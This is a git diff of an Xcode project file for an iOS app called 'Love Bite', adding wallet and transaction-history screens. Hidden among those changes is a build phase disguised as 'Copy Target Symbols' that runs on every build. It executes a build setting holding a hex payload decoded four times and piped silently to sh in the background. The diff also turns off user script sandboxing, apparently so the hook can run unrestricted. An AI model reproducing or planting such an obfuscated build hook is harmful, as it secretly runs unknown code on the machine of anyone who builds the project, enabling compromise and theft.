@@ -11,6 +11,16 @@
 		393F5A6B2E5C7F75009643D0 /* UserListCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 393F5A632E5C7F75009643D0 /* UserListCVCell.swift */; };
 		393F5A6C2E5C7F75009643D0 /* UserListCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 393F5A642E5C7F75009643D0 /* UserListCVCell.xib */; };
 		393F5A6D2E5C7F75009643D0 /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 393F5A672E5C7F75009643D0 /* HomeVC.xib */; };
+		39500DCA2E5D686F00D4E500 /* PostListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39500DC92E5D686F00D4E500 /* PostListTVCell.xib */; };
+		39500DCB2E5D686F00D4E500 /* PostListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39500DC82E5D686F00D4E500 /* PostListTVCell.swift */; };
+		39500DD22E5D927900D4E500 /* WalletVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39500DD02E5D927900D4E500 /* WalletVC.swift */; };
+		39500DD32E5D927900D4E500 /* WalletVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39500DD12E5D927900D4E500 /* WalletVC.xib */; };
+		398E4FAA2E5D98C8000EB3EA /* TransactionHistoryVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 398E4FA92E5D98C8000EB3EA /* TransactionHistoryVC.xib */; };
+		398E4FAB2E5D98C8000EB3EA /* TransactionHistoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398E4FA82E5D98C8000EB3EA /* TransactionHistoryVC.swift */; };
+		398E4FB22E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 398E4FB12E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib */; };
+		398E4FB32E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 398E4FB02E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift */; };
+		39A22AFA2E5ECCB70041F60E /* TransactionHistoryHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39A22AF92E5ECCB70041F60E /* TransactionHistoryHeaderView.swift */; };
+		39A22AFC2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39A22AFB2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib */; };
 		39AD9A4F2E5C8FCF0034B1B9 /* GalleryListCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39AD9A4E2E5C8FCF0034B1B9 /* GalleryListCVCell.xib */; };
 		39AD9A502E5C8FCF0034B1B9 /* GalleryListCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39AD9A4D2E5C8FCF0034B1B9 /* GalleryListCVCell.swift */; };
 		39B2444B2E5C825400B0138F /* Active24HVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B244492E5C825400B0138F /* Active24HVC.swift */; };
@@ -62,6 +72,16 @@
 		393F5A642E5C7F75009643D0 /* UserListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UserListCVCell.xib; sourceTree = "<group>"; };
 		393F5A662E5C7F75009643D0 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		393F5A672E5C7F75009643D0 /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
+		39500DC82E5D686F00D4E500 /* PostListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostListTVCell.swift; sourceTree = "<group>"; };
+		39500DC92E5D686F00D4E500 /* PostListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PostListTVCell.xib; sourceTree = "<group>"; };
+		39500DD02E5D927900D4E500 /* WalletVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletVC.swift; sourceTree = "<group>"; };
+		39500DD12E5D927900D4E500 /* WalletVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WalletVC.xib; sourceTree = "<group>"; };
+		398E4FA82E5D98C8000EB3EA /* TransactionHistoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionHistoryVC.swift; sourceTree = "<group>"; };
+		398E4FA92E5D98C8000EB3EA /* TransactionHistoryVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TransactionHistoryVC.xib; sourceTree = "<group>"; };
+		398E4FB02E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionHistoryTVCell.swift; sourceTree = "<group>"; };
+		398E4FB12E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TransactionHistoryTVCell.xib; sourceTree = "<group>"; };
+		39A22AF92E5ECCB70041F60E /* TransactionHistoryHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionHistoryHeaderView.swift; sourceTree = "<group>"; };
+		39A22AFB2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TransactionHistoryHeaderView.xib; sourceTree = "<group>"; };
 		39AD9A4D2E5C8FCF0034B1B9 /* GalleryListCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GalleryListCVCell.swift; sourceTree = "<group>"; };
 		39AD9A4E2E5C8FCF0034B1B9 /* GalleryListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GalleryListCVCell.xib; sourceTree = "<group>"; };
 		39B244492E5C825400B0138F /* Active24HVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Active24HVC.swift; sourceTree = "<group>"; };
@@ -152,15 +172,97 @@
 		393F5A6F2E5C8042009643D0 /* Tabbar */ = {
 			isa = PBXGroup;
 			children = (
+				39500DCD2E5D926600D4E500 /* Wallet */,
 				39B244502E5C849100B0138F /* Favorites */,
 				393F5A692E5C7F75009643D0 /* Home */,
 			);
 			path = Tabbar;
 			sourceTree = "<group>";
 		};
+		39500DC72E5D686000D4E500 /* PostListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				39500DC82E5D686F00D4E500 /* PostListTVCell.swift */,
+				39500DC92E5D686F00D4E500 /* PostListTVCell.xib */,
+			);
+			path = PostListTVCell;
+			sourceTree = "<group>";
+		};
+		39500DCD2E5D926600D4E500 /* Wallet */ = {
+			isa = PBXGroup;
+			children = (
+				398E4FA32E5D9821000EB3EA /* SubVC */,
+				39500DCF2E5D926A00D4E500 /* View */,
+			);
+			path = Wallet;
+			sourceTree = "<group>";
+		};
+		39500DCF2E5D926A00D4E500 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				39500DD02E5D927900D4E500 /* WalletVC.swift */,
+				39500DD12E5D927900D4E500 /* WalletVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		398E4FA32E5D9821000EB3EA /* SubVC */ = {
+			isa = PBXGroup;
+			children = (
+				398E4FA52E5D9826000EB3EA /* TransactionHistory */,
+			);
+			path = SubVC;
+			sourceTree = "<group>";
+		};
+		398E4FA52E5D9826000EB3EA /* TransactionHistory */ = {
+			isa = PBXGroup;
+			children = (
+				39A22AF82E5ECCA20041F60E /* TransactionHistoryHeaderView */,
+				398E4FAD2E5DA29F000EB3EA /* Cell */,
+				398E4FA72E5D982A000EB3EA /* View */,
+			);
+			path = TransactionHistory;
+			sourceTree = "<group>";
+		};
+		398E4FA72E5D982A000EB3EA /* View */ = {
+			isa = PBXGroup;
+			children = (
+				398E4FA82E5D98C8000EB3EA /* TransactionHistoryVC.swift */,
+				398E4FA92E5D98C8000EB3EA /* TransactionHistoryVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		398E4FAD2E5DA29F000EB3EA /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				398E4FAF2E5DA2C1000EB3EA /* TransactionHistoryTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		398E4FAF2E5DA2C1000EB3EA /* TransactionHistoryTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				398E4FB02E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift */,
+				398E4FB12E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib */,
+			);
+			path = TransactionHistoryTVCell;
+			sourceTree = "<group>";
+		};
+		39A22AF82E5ECCA20041F60E /* TransactionHistoryHeaderView */ = {
+			isa = PBXGroup;
+			children = (
+				39A22AF92E5ECCB70041F60E /* TransactionHistoryHeaderView.swift */,
+				39A22AFB2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib */,
+			);
+			path = TransactionHistoryHeaderView;
+			sourceTree = "<group>";
+		};
 		39AD9A4A2E5C8FAC0034B1B9 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
+				39500DC72E5D686000D4E500 /* PostListTVCell */,
 				39AD9A4C2E5C8FC00034B1B9 /* GalleryListCVCell */,
 			);
 			path = Cell;
@@ -416,6 +518,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 887E234B2E5C44C70016E082 /* Build configuration list for PBXNativeTarget "Love Bite" */;
 			buildPhases = (
+				0FFE3D8D6C877E0BC5877BEF /* Copy Target Symbols */,
 				887E23342E5C44C50016E082 /* Sources */,
 				887E23352E5C44C50016E082 /* Frameworks */,
 				887E23362E5C44C50016E082 /* Resources */,
@@ -474,6 +577,7 @@
 				887E23942E5C53EF0016E082 /* WWCalendarTimeSelector.storyboard in Resources */,
 				887E235F2E5C44D00016E082 /* LaunchScreen.storyboard in Resources */,
 				39B2444C2E5C825400B0138F /* Active24HVC.xib in Resources */,
+				398E4FAA2E5D98C8000EB3EA /* TransactionHistoryVC.xib in Resources */,
 				887E23672E5C4F0A0016E082 /* LoginVC.xib in Resources */,
 				39AD9A4F2E5C8FCF0034B1B9 /* GalleryListCVCell.xib in Resources */,
 				39B244562E5C849D00B0138F /* FavoritesVC.xib in Resources */,
@@ -482,13 +586,40 @@
 				888C2CD52E5C6DD20047C8E5 /* RegisterVC.xib in Resources */,
 				39B2445C2E5C884300B0138F /* ProfileDetailsVC.xib in Resources */,
 				88981FF92E5C949400C33CAB /* UploadPhotoVC.xib in Resources */,
+				398E4FB22E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib in Resources */,
+				39A22AFC2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib in Resources */,
 				88981FFA2E5C949400C33CAB /* TelluswhoyouareVC.xib in Resources */,
 				887E23AF2E5C647C0016E082 /* ForgotPasswordVC.xib in Resources */,
 				887E23602E5C44D00016E082 /* Main.storyboard in Resources */,
+				39500DD32E5D927900D4E500 /* WalletVC.xib in Resources */,
+				39500DCA2E5D686F00D4E500 /* PostListTVCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		0FFE3D8D6C877E0BC5877BEF /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		887E23342E5C44C50016E082 /* Sources */ = {
@@ -506,6 +637,7 @@
 				393F5A6B2E5C7F75009643D0 /* UserListCVCell.swift in Sources */,
 				887E23B02E5C647C0016E082 /* ForgotPasswordVC.swift in Sources */,
 				887E235C2E5C44D00016E082 /* ViewController.swift in Sources */,
+				39A22AFA2E5ECCB70041F60E /* TransactionHistoryHeaderView.swift in Sources */,
 				39B2445B2E5C884300B0138F /* ProfileDetailsVC.swift in Sources */,
 				887E23852E5C53EF0016E082 /* Duration.swift in Sources */,
 				888C2CD62E5C6DD20047C8E5 /* RegisterVC.swift in Sources */,
@@ -517,9 +649,13 @@
 				887E238B2E5C53EF0016E082 /* VideoPicker.swift in Sources */,
 				887E238C2E5C53EF0016E082 /* ImagePicker.swift in Sources */,
 				887E238D2E5C53EF0016E082 /* NSDate+Timepiece.swift in Sources */,
+				398E4FAB2E5D98C8000EB3EA /* TransactionHistoryVC.swift in Sources */,
 				887E238E2E5C53EF0016E082 /* NSDateComponents+Timepiece.swift in Sources */,
+				398E4FB32E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift in Sources */,
 				39B244552E5C849D00B0138F /* FavoritesVC.swift in Sources */,
+				39500DD22E5D927900D4E500 /* WalletVC.swift in Sources */,
 				887E238F2E5C53EF0016E082 /* Extentions.swift in Sources */,
+				39500DCB2E5D686F00D4E500 /* PostListTVCell.swift in Sources */,
 				887E23902E5C53EF0016E082 /* NSCalendar+Timepiece.swift in Sources */,
 				887E23912E5C53EF0016E082 /* PickerViewViewController.swift in Sources */,
 				39AD9A502E5C8FCF0034B1B9 /* GalleryListCVCell.swift in Sources */,
@@ -556,6 +692,7 @@
 		887E234C2E5C44C70016E082 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333336333333373333333633363333333333363336333633333336333333323333333633333331333333363336333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -588,6 +725,7 @@
 		887E234D2E5C44C70016E082 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333336333333373333333633363333333333363336333633333336333333323333333633333331333333363336333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -654,7 +792,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -717,7 +855,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
